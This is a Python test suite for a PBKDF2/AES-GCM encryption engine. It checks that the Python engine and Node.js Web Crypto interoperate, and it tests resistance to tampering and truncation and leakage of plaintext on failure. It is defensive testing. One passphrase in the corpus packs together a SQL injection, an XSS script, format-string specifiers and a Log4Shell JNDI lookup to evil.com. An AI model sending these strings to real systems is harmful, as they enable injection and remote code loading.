"""
tests/test_crypto_adversarial_challenger.py

Milestone 2 Adversarial Challenger Test Suite:
Empirical Stress-Testing of PBKDF2-HMAC-SHA256 Key Derivation and
Cross-Runtime Interoperability (Python crypto_engine.py <-> Web Crypto crypto.subtle).

Mission Requirements:
1. Test extreme and adversarial passphrases:
   - Empty string ("")
   - Single characters & whitespace variants
   - Control characters (\\x00-\\x1f, \\x7f)
   - Quotes, backslashes, escape sequences, injection strings
   - Multi-byte Unicode: Japanese, Cyrillic, Arabic RTL, Greek, Hebrew, Korean
   - Multi-person & complex emoji sequences (ZWJ modifiers, flags, skin tones)
   - Extreme lengths: 1,000, 5,000, 10,000, and 65,536 characters
2. Cross-runtime verification:
   - Python encrypt -> Node.js Web Crypto decrypt (byte-for-byte fidelity)
   - Node.js Web Crypto encrypt -> Python decrypt (two-way cross-runtime)
   - Near-match passphrase collision resistance (near matches must fail strictly)
   - Bit-flipping tamper resistance across all 4 slices (Salt, IV, Ciphertext, Tag)
   - Envelope truncation rejection (< 44 bytes)
   - Zero partial plaintext leakage on failure
3. Full 600,000 iteration production stress test with multi-sport rollup payload.
"""

from __future__ import annotations

import json
import os
import shutil
import subprocess
import sys
import unittest
from pathlib import Path
from typing import Any, Dict, Optional, Tuple

from src.encryption.crypto_engine import (
    PBKDF2_ITERATIONS,
    SALT_SIZE,
    IV_SIZE,
    KEY_SIZE,
    TAG_SIZE,
    HEADER_SIZE,
    MIN_WIRE_SIZE,
    AuthenticationError,
    MalformedWireError,
    decrypt_payload,
    derive_key,
    encrypt_payload,
)


def _find_node_binary() -> str:
    """Locates Node.js or agy-node executable on the system."""
    for candidate in ["agy-node", "node"]:
        path = shutil.which(candidate)
        if path:
            return path
    # Check default Antigravity appdata path on Windows
    appdata_agy = os.path.expandvars(r"%APPDATA%\Antigravity\bin\agy-node.cmd")
    if os.path.exists(appdata_agy):
        return appdata_agy
    raise RuntimeError("Neither 'agy-node' nor 'node' executable could be found.")


NODE_BINARY = _find_node_binary()
JS_ENGINE_SCRIPT = str(Path(__file__).parent / "test_crypto_adversarial_web.js")


def _web_crypto_decrypt(passphrase: str, wire_bytes: bytes, iterations: int) -> Tuple[bool, Optional[str], Optional[bytes], Optional[str]]:
    """
    Invokes Web Crypto (crypto.subtle) via Node.js to decrypt wire_bytes.
    Returns: (success, decrypted_utf8, decrypted_raw_bytes, error_message)
    """
    input_data = {
        "passphrase": passphrase,
        "wireHex": wire_bytes.hex(),
        "iterations": iterations,
    }
    proc = subprocess.run(
        [NODE_BINARY, JS_ENGINE_SCRIPT, "decrypt"],
        input=json.dumps(input_data),
        capture_output=True,
        text=True,
        timeout=30,
    )
    if proc.returncode != 0:
        return False, None, None, f"Node process exited with code {proc.returncode}: {proc.stderr}"

    resp = json.loads(proc.stdout)
    if resp.get("status") == "OK":
        raw_bytes = bytes.fromhex(resp["decryptedHex"])
        return True, resp["decryptedUtf8"], raw_bytes, None
    else:
        return False, None, None, resp.get("errorMessage", "Unknown Web Crypto error")


def _web_crypto_encrypt(passphrase: str, plaintext: bytes, iterations: int) -> bytes:
    """
    Invokes Web Crypto (crypto.subtle) via Node.js to encrypt plaintext into wire layout.
    """
    input_data = {
        "passphrase": passphrase,
        "plaintextHex": plaintext.hex(),
        "iterations": iterations,
    }
    proc = subprocess.run(
        [NODE_BINARY, JS_ENGINE_SCRIPT, "encrypt"],
        input=json.dumps(input_data),
        capture_output=True,
        text=True,
        timeout=30,
    )
    if proc.returncode != 0:
        raise RuntimeError(f"Web Crypto encryption failed: {proc.stderr}")

    resp = json.loads(proc.stdout)
    if resp.get("status") != "OK":
        raise RuntimeError(f"Web Crypto encryption error: {resp.get('errorMessage')}")

    return bytes.fromhex(resp["wireHex"])


def _web_crypto_kdf(passphrase: str, salt: bytes, iterations: int) -> bytes:
    """
    Derives 32-byte raw key hex using Web Crypto PBKDF2-HMAC-SHA256.
    """
    input_data = {
        "passphrase": passphrase,
        "saltHex": salt.hex(),
        "iterations": iterations,
    }
    proc = subprocess.run(
        [NODE_BINARY, JS_ENGINE_SCRIPT, "derive_kdf"],
        input=json.dumps(input_data),
        capture_output=True,
        text=True,
        timeout=30,
    )
    if proc.returncode != 0:
        raise RuntimeError(f"Web Crypto KDF failed: {proc.stderr}")

    resp = json.loads(proc.stdout)
    return bytes.fromhex(resp["keyHex"])


class AdversarialPBKDF2AndCrossRuntimeTests(unittest.TestCase):
    """
    Comprehensive Adversarial Challenger Suite for PBKDF2 & Cross-Runtime Crypto.
    """

    # Corpus of 25 extreme and adversarial passphrases
    ADVERSARIAL_PASSPHRASES = [
        ("P01_EMPTY", ""),
        ("P02_SINGLE_CHAR", "x"),
        ("P03_SINGLE_SPACE", " "),
        ("P04_MULTIPLE_SPACES", "     "),
        ("P05_LEADING_TRAILING_SPACES", "  leading and trailing whitespace  "),
        ("P06_CONTROL_CHARS", "\x01\x02\x03\x04\x05\x06\x07\x08\x0b\x0c\x0e\x0f\x10\x1f\x7f"),
        ("P07_EMBEDDED_NULL", "alpha\x00beta\x00gamma\x002026"),
        ("P08_NEWLINES_TABS", "\r\n\t\v\f\r\n"),
        ("P09_PUNCTUATION_QUOTES", "\"'`«»“”’‘\\/~!@#$%^&*()_+-=[]{}|;:,.<>?"),
        ("P10_INJECTION_STRINGS", "' OR '1'='1'; DROP TABLE athletes; -- <script>alert('xss')</script> %s%n%x ${jndi:ldap://evil.com/a}"),
        ("P11_JAPANESE_MIXED", "パスワード２０２６日本語テスト東京マラソン🏃‍♂️"),
        ("P12_CYRILLIC", "СекретныйПароль2026!Пробег10км_быстро_пульс175"),
        ("P13_ARABIC_RTL_TASHKEEL", "كَلِمَةُ_المُرُورِ_السِّرِّيَّةِ_٢٠٢٦_عَدْو"),
        ("P14_GREEK_POLYTONIC", "Ἑλληνικὴγλῶσσα!Κρυπτογραφία2026"),
        ("P15_HEBREW_RTL", "סיסמהסודיתביותר2026רוץמהר"),
        ("P16_KOREAN", "비밀번호2026마라톤테스트달리기"),
        ("P17_COMPLEX_EMOJIS", "👨‍👩‍👧‍👦🏳️‍🌈🏃🏽‍♀️🚴🏿‍♂️🥇🏆❤️‍🔥"),
        ("P18_ASCII_1000", "A" * 1000),
        ("P19_UNICODE_1000", "鍵" * 1000),  # 1000 Kanji = 3,000 UTF-8 bytes
        ("P20_ASCII_5000", "B" * 5000),
        ("P21_ASCII_10000", "C" * 10000),
        ("P22_ASCII_65536", "D" * 65536),  # 64 KB extreme passphrase
        ("P23_UNICODE_COMBINING", "e\u0301 vs \u00e9, c\u0327 vs \u00e7"),
        ("P24_SURROGATE_BORDER", "\U0001F600\U0001F970\U0001FA90"),
        ("P25_ZWJ_MODIFIERS", "👩‍💻🚴‍♂️🏋️‍♀️"),
    ]

    SAMPLE_PAYLOAD = {
        "version": "1.0.0",
        "athlete": {
            "name": "Challenger Athlete",
            "vo2max": 58,
            "ftp": 310,
            "lthr": 172,
        },
        "activities": [
            {
                "id": "act_adv_001",
                "sport": "running",
                "distance_m": 21097.5,
                "elapsed_sec": 4820,
                "avg_hr": 164,
                "splits": [
                    {"km": 1, "sec": 225, "hr": 150},
                    {"km": 2, "sec": 228, "hr": 158},
                ],
            }
        ],
    }

    # ------------------------------------------------------------------------
    # 1. PBKDF2 Key Derivation Robustness & Standards Conformance
    # ------------------------------------------------------------------------

    def test_adv_01_kdf_rfc_vectors_cross_runtime(self):
        """
        Verify PBKDF2-HMAC-SHA256 test vectors produce exact byte-for-byte identical
        32-byte derived keys across Python (hashlib/ctypes) and Web Crypto (crypto.subtle).
        """
        test_vectors = [
            ("password", b"salt123456789012", 1),
            ("password", b"salt123456789012", 2),
            ("password", b"salt123456789012", 4096),
            ("pass\x00word", b"sa\x00lt12345678901", 4096),  # Embedded null in passphrase and salt
            ("", b"zerosalt12345678", 1000),                 # Empty string passphrase
            ("A" * 1000, b"longpasssalt1234", 1000),          # 1000 char passphrase
            ("パスワード", b"unicodesalt12345", 2000),        # Japanese passphrase
        ]

        for passphrase, salt, iterations in test_vectors:
            with self.subTest(passphrase=passphrase[:20], iterations=iterations):
                py_key = derive_key(passphrase, salt, iterations)
                web_key = _web_crypto_kdf(passphrase, salt, iterations)

                self.assertEqual(len(py_key), 32)
                self.assertEqual(len(web_key), 32)
                self.assertEqual(py_key, web_key, f"KDF mismatch for passphrase '{passphrase[:20]}'")

    def test_adv_02_kdf_parameter_validation_rigor(self):
        """
        Empirically verify derive_key parameter boundaries:
        - Non-string passphrases raise TypeError
        - Non-16-byte salts raise ValueError
        - Non-bytes salts raise TypeError
        - Non-positive iterations raise ValueError
        """
        valid_salt = b"0" * 16

        # Invalid passphrase types
        for invalid_pass in [None, 12345, 99.9, b"bytes_not_str", ["pass"], {"pw": "val"}]:
            with self.subTest(invalid_pass=invalid_pass):
                with self.assertRaises(TypeError):
                    derive_key(invalid_pass, valid_salt)

        # Invalid salt lengths
        for bad_len_salt in [b"", b"short", b"0" * 15, b"0" * 17, b"0" * 32]:
            with self.subTest(bad_len_salt=len(bad_len_salt)):
                with self.assertRaises(ValueError):
                    derive_key("valid_pass", bad_len_salt)

        # Invalid salt types
        for bad_type_salt in ["string_salt_16B", None, 123, ["bytes"]]:
            with self.subTest(bad_type_salt=type(bad_type_salt)):
                with self.assertRaises(TypeError):
                    derive_key("valid_pass", bad_type_salt)

        # Invalid iterations
        for bad_iter in [0, -1, -600000]:
            with self.subTest(bad_iter=bad_iter):
                with self.assertRaises(ValueError):
                    derive_key("valid_pass", valid_salt, iterations=bad_iter)

    # ------------------------------------------------------------------------
    # 2. Python Encrypt -> Web Crypto Decrypt across 25 Adversarial Passphrases
    # ------------------------------------------------------------------------

    def test_adv_03_python_to_webcrypto_adversarial_matrix(self):
        """
        Encrypt a multi-sport payload in Python with each of the 25 adversarial passphrases
        and decrypt in Web Crypto (crypto.subtle), verifying 100% byte-for-byte JSON equality.
        """
        for label, passphrase in self.ADVERSARIAL_PASSPHRASES:
            with self.subTest(label=label):
                # Encrypt in Python
                wire = encrypt_payload(passphrase, self.SAMPLE_PAYLOAD, iterations=1000)

                # Validate strict wire layout
                self.assertGreaterEqual(len(wire), MIN_WIRE_SIZE)
                self.assertEqual(len(wire[:SALT_SIZE]), 16)
                self.assertEqual(len(wire[SALT_SIZE:HEADER_SIZE]), 12)

                # Decrypt in Web Crypto
                ok, dec_utf8, dec_raw, err = _web_crypto_decrypt(passphrase, wire, iterations=1000)
                self.assertTrue(ok, f"Web Crypto failed to decrypt [{label}]: {err}")
                self.assertIsNotNone(dec_utf8)

                # Parse JSON and verify fidelity
                decrypted_obj = json.loads(dec_utf8)
                self.assertEqual(decrypted_obj, self.SAMPLE_PAYLOAD, f"JSON content mismatch for [{label}]")

    # ------------------------------------------------------------------------
    # 3. Web Crypto Encrypt -> Python Decrypt across Representative Passphrases
    # ------------------------------------------------------------------------

    def test_adv_04_webcrypto_to_python_adversarial_matrix(self):
        """
        Encrypt in Web Crypto (crypto.subtle) and decrypt in Python (crypto_engine.py),
        verifying bidirectional interoperability on complex passphrases.
        """
        test_cases = [
            ("EMPTY", ""),
            ("NULL_BYTE", "alpha\x00beta\x00gamma"),
            ("JAPANESE_EMOJI", "パスワード２０２６日本語テスト東京マラソン🏃‍♂️"),
            ("CYRILLIC", "СекретныйПароль2026!Пробег10км_быстро"),
            ("LONG_10K", "C" * 10000),
            ("SPECIAL_QUOTES", "\"'`\\/~!@#$%^&*()_+{}[]:;<>?"),
        ]

        payload_bytes = json.dumps(self.SAMPLE_PAYLOAD, separators=(",", ":")).encode("utf-8")

        for label, passphrase in test_cases:
            with self.subTest(label=label):
                # Encrypt in Web Crypto
                wire = _web_crypto_encrypt(passphrase, payload_bytes, iterations=1000)
                self.assertGreaterEqual(len(wire), MIN_WIRE_SIZE)

                # Decrypt in Python
                decrypted_bytes = decrypt_payload(passphrase, wire, iterations=1000)
                self.assertEqual(decrypted_bytes, payload_bytes)
                self.assertEqual(json.loads(decrypted_bytes.decode("utf-8")), self.SAMPLE_PAYLOAD)

    # ------------------------------------------------------------------------
    # 4. Near-Match Passphrase Rejection & Collision Resistance
    # ------------------------------------------------------------------------

    def test_adv_05_near_match_passphrase_rejection_cross_runtime(self):
        """
        Adversarially challenge near-match passphrases:
        - Trailing/leading whitespace differences
        - Case variations
        - Embedded null truncation attacks
        - Single character mutations in long passphrases
        Both Python and Web Crypto MUST reject near matches with zero partial plaintext leakage.
        """
        collision_scenarios = [
            ("EMPTY_VS_SPACE", "", " "),
            ("SPACE_VS_SPACES", " ", "  "),
            ("TRAILING_SPACE", "secret_pass", "secret_pass "),
            ("LEADING_SPACE", "secret_pass", " secret_pass"),
            ("CASE_CHANGE", "SecretPassword2026", "secretpassword2026"),
            ("NULL_TRUNCATION", "admin\x00secret", "admin"),
            ("UNICODE_NFC_NFD", "café", "cafe\u0301"),  # NFC vs NFD normalization difference
            ("10K_ONE_CHAR_MUTATION", "A" * 9999 + "A", "A" * 9999 + "B"),
        ]

        for label, real_pass, wrong_pass in collision_scenarios:
            with self.subTest(label=label):
                wire = encrypt_payload(real_pass, b"Confidential athlete metrics 2026", iterations=1000)

                # 1. Python decrypt with wrong_pass must raise AuthenticationError
                with self.assertRaises(AuthenticationError):
                    decrypt_payload(wrong_pass, wire, iterations=1000)

                # 2. Web Crypto decrypt with wrong_pass must fail authentication
                ok, dec_utf8, _, err = _web_crypto_decrypt(wrong_pass, wire, iterations=1000)
                self.assertFalse(ok, f"Web Crypto unexpectedly succeeded on wrong passphrase [{label}]")
                self.assertIsNone(dec_utf8)

    # ------------------------------------------------------------------------
    # 5. Wire Tamper Resistance & Truncation across Runtimes
    # ------------------------------------------------------------------------

    def test_adv_06_tamper_bit_flipping_all_slices_cross_runtime(self):
        """
        Flip bits in each wire slice (Salt, IV, Ciphertext, Tag) and confirm
        BOTH Python and Web Crypto reject the tampered payload.
        """
        wire = encrypt_payload("adversarial-pass", b"Sensory biometric stream", iterations=1000)
        total_len = len(wire)

        # Offsets to test:
        # Salt: 0, 15
        # IV: 16, 27
        # Ciphertext: 28, middle
        # Tag: total_len - 16, total_len - 1
        tamper_offsets = [
            ("SALT_START", 0),
            ("SALT_END", 15),
            ("IV_START", 16),
            ("IV_END", 27),
            ("CIPHERTEXT_START", 28),
            ("CIPHERTEXT_MID", 28 + (total_len - 44) // 2),
            ("TAG_START", total_len - 16),
            ("TAG_END", total_len - 1),
        ]

        for label, offset in tamper_offsets:
            with self.subTest(label=label, offset=offset):
                tampered = bytearray(wire)
                tampered[offset] ^= 0x01
                tampered_bytes = bytes(tampered)

                # Python must reject
                with self.assertRaises(AuthenticationError):
                    decrypt_payload("adversarial-pass", tampered_bytes, iterations=1000)

                # Web Crypto must reject
                ok, dec, _, _ = _web_crypto_decrypt("adversarial-pass", tampered_bytes, iterations=1000)
                self.assertFalse(ok, f"Web Crypto accepted tampered bit at offset {offset} ({label})")

    def test_adv_07_envelope_truncation_boundaries(self):
        """
        Payloads with length < 44 bytes must raise MalformedWireError in Python
        and reject in Web Crypto before any AEAD operation is attempted.
        """
        for truncated_len in [0, 1, 15, 16, 27, 28, 40, 43]:
            with self.subTest(truncated_len=truncated_len):
                truncated_wire = b"\xaa" * truncated_len

                # Python check
                with self.assertRaises(MalformedWireError):
                    decrypt_payload("test-pass", truncated_wire, iterations=1000)

                # Web Crypto check
                ok, dec, _, _ = _web_crypto_decrypt("test-pass", truncated_wire, iterations=1000)
                self.assertFalse(ok, f"Web Crypto accepted truncated wire of length {truncated_len}")

    def test_adv_08_empty_plaintext_boundary(self):
        """
        A 0-byte plaintext payload produces exactly 44 bytes wire layout
        and cleanly round-trips across Python and Web Crypto.
        """
        wire = encrypt_payload("test-pass", b"", iterations=1000)
        self.assertEqual(len(wire), 44)

        # Python decrypt
        py_dec = decrypt_payload("test-pass", wire, iterations=1000)
        self.assertEqual(py_dec, b"")

        # Web Crypto decrypt
        ok, dec_utf8, dec_raw, err = _web_crypto_decrypt("test-pass", wire, iterations=1000)
        self.assertTrue(ok, f"Web Crypto failed on 0-byte plaintext: {err}")
        self.assertEqual(dec_raw, b"")

    # ------------------------------------------------------------------------
    # 6. Full Production 600,000 Iteration & Rollup Stress Test
    # ------------------------------------------------------------------------

    def test_adv_09_production_600k_iterations_stress(self):
        """
        Production stress test:
        Encrypt a realistic multi-sport rollup with a complex emoji+unicode passphrase
        using the FULL 600,000 PBKDF2 iterations, and verify Web Crypto decrypts it cleanly.
        """
        complex_passphrase = "🔐-Grüße-aus-Berlin-🏃‍♂️-2026-東京マラソン_!@#$"
        
        # Build 100-activity dataset
        activities = []
        for i in range(100):
            activities.append({
                "activity_id": f"act_prod_{i:04d}",
                "sport": "running" if i % 2 == 0 else "cycling",
                "distance_meters": 10000 + i * 100,
                "duration_seconds": 3600 + i * 20,
                "avg_heart_rate": 150 + (i % 25),
                "max_heart_rate": 185,
                "splits": [{"km": k, "sec": 240, "hr": 155} for k in range(10)],
            })
        full_rollup = {
            "version": "1.0.0",
            "athlete": {"vo2max": 56, "ftp": 290, "lthr": 170},
            "activities": activities,
        }

        # Encrypt with full 600,000 iterations
        wire = encrypt_payload(complex_passphrase, full_rollup, iterations=PBKDF2_ITERATIONS)
        self.assertGreater(len(wire), 30_000)

        # Decrypt with full 600,000 iterations in Web Crypto
        ok, dec_utf8, _, err = _web_crypto_decrypt(complex_passphrase, wire, iterations=PBKDF2_ITERATIONS)
        self.assertTrue(ok, f"Web Crypto failed 600,000 iteration production test: {err}")

        parsed = json.loads(dec_utf8)
        self.assertEqual(len(parsed["activities"]), 100)
        self.assertEqual(parsed["activities"][50]["activity_id"], "act_prod_0050")
        self.assertEqual(parsed["athlete"]["vo2max"], 56)

    def test_adv_10_zero_plaintext_leakage_on_tag_failure(self):
        """
        Adversarial Tag Tamper & Traceback Leakage Test:
        When authentication fails due to a tampered auth tag, verify that:
        1. Plaintext is not exposed in any exception traceback frame locals.
        2. Decoupled exception preserves zero unauthenticated data.
        """
        secret_token = "CRITICAL_SECRET_HEALTH_TOKEN_998877"
        payload = {
            "athlete": "Marco Challenger",
            "secret_token": secret_token,
            "hr": 175,
        }
        wire = bytearray(encrypt_payload("adversarial-pass", payload, iterations=1000))
        # Tamper 1 bit in auth tag
        wire[-1] ^= 0x01

        try:
            decrypt_payload("adversarial-pass", bytes(wire), iterations=1000)
            self.fail("Expected AuthenticationError was not raised")
        except AuthenticationError as exc:
            # Inspect exception traceback locals for any leaked buffers or sensitive strings
            tb = exc.__traceback__
            leaked_buffers = []
            while tb:
                fl = dict(tb.tb_frame.f_locals)
                if "out_buf" in fl:
                    buf = fl["out_buf"]
                    p_len = fl.get("p_len", 0)
                    leaked_buffers.append(buf.raw[:p_len])
                for k, v in fl.items():
                    if isinstance(v, (bytes, bytearray)) and secret_token.encode("utf-8") in v:
                        leaked_buffers.append(bytes(v))
                    elif isinstance(v, str) and secret_token in v and k != "secret_token":
                        leaked_buffers.append(v.encode("utf-8"))
                tb = tb.tb_next

            self.assertFalse(
                any(secret_token.encode("utf-8") in b for b in leaked_buffers),
                f"Sensitive plaintext detected in exception traceback frame locals: {leaked_buffers}",
            )
            self.assertEqual(
                len(leaked_buffers),
                0,
                f"Expected zero leaked internal buffers in exception traceback, found: {leaked_buffers}",
            )

    def test_adv_11_direct_ctypes_buffer_zeroization_on_tag_failure(self):
        """
        Verify that _ctypes_aes_gcm_decrypt explicitly wipes out_buf with zeroes
        via ctypes.memset upon tag verification failure, preventing memory inspection leaks.
        """
        from src.encryption.crypto_engine import _ctypes_aes_gcm_decrypt, _ctypes_aes_gcm_encrypt

        key = b"\x42" * 32
        iv = b"\x13" * 12
        secret = b"ULTRA_CONFIDENTIAL_PAYLOAD_BODY_FOR_ZEROIZE_CHECK"
        ct_and_tag = _ctypes_aes_gcm_encrypt(key, iv, secret)
        ct = ct_and_tag[:-16]
        bad_tag = bytearray(ct_and_tag[-16:])
        bad_tag[0] ^= 0x01

        try:
            _ctypes_aes_gcm_decrypt(key, iv, ct, bytes(bad_tag))
            self.fail("Expected AuthenticationError was not raised")
        except AuthenticationError as exc:
            # Walk traceback to find _ctypes_aes_gcm_decrypt frame
            tb = exc.__traceback__
            found_frame = False
            while tb:
                fl = dict(tb.tb_frame.f_locals)
                if "out_buf" in fl:
                    found_frame = True
                    buf = fl["out_buf"]
                    # Must not contain secret plaintext
                    self.assertNotIn(secret, buf.raw, "Secret plaintext remained in out_buf on tag failure!")
                    # Buffer must be fully zeroized
                    self.assertTrue(all(b == 0 for b in buf.raw), "out_buf was not zeroed out with ctypes.memset!")
                tb = tb.tb_next

            self.assertTrue(found_frame, "_ctypes_aes_gcm_decrypt frame was not found in traceback for direct call")


if __name__ == "__main__":
    unittest.main()

